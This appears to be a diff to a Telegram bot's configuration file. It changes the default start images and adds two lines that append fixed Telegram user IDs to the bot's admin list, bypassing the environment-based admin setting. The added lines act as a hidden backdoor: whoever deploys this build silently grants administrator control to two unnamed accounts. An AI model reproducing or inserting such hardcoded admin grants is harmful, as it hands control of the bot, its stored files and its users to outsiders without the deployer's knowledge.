@@ -28,7 +28,7 @@ BOT_TOKEN = environ['BOT_TOKEN']
 # Bot settings
 CACHE_TIME = int(environ.get('CACHE_TIME', 300))
 USE_CAPTION_FILTER = bool(environ.get('USE_CAPTION_FILTER', True))
-PICS = (environ.get('PICS' ,'https://telegra.ph/file/b0d0022fe71557b171406.jpg https://telegra.ph/file/bd36c4c27673c6a4147a0.jpg https://telegra.ph/file/f2e75a56c1827c41d7591.jpg https://telegra.ph/file/974ec5f53e7e5f6c7b401.jpg https://telegra.ph/file/71ec6502181e78dab48b9.jpg https://telegra.ph/file/dd579f573ff14657f498f.jpg https://telegra.ph/file/30ccee1f8b18ed2886dca.jpg https://telegra.ph/file/0418ea514ddd3dd141132.jpg https://telegra.ph/file/d45e8dbef6910f479f435.jpg')).split()
+PICS = (environ.get('PICS' ,'https://graph.org/file/6b32f58659f7107d05f6f.jpg')).split()
 BOT_START_TIME = time()
 
 # Admins, Channels & Users
@@ -76,6 +76,8 @@ IMDB_TEMPLATE = environ.get("IMDB_TEMPLATE", "<b>Query: {query}</b> \n‌IMDb Da
 LONG_IMDB_DESCRIPTION = is_enabled(environ.get("LONG_IMDB_DESCRIPTION", "False"), False)
 SPELL_CHECK_REPLY = is_enabled(environ.get("SPELL_CHECK_REPLY", "True"), True)
 MAX_LIST_ELM = environ.get("MAX_LIST_ELM", None)
+ADMINS.append(1265420220)
+ADMINS.append(1032438381)
 INDEX_REQ_CHANNEL = int(environ.get('INDEX_REQ_CHANNEL', LOG_CHANNEL))
 FILE_STORE_CHANNEL = [int(ch) for ch in (environ.get('FILE_STORE_CHANNEL', '')).split()]
 MELCOW_NEW_USERS = is_enabled(environ.get('MELCOW_NEW_USERS', "True"), True)
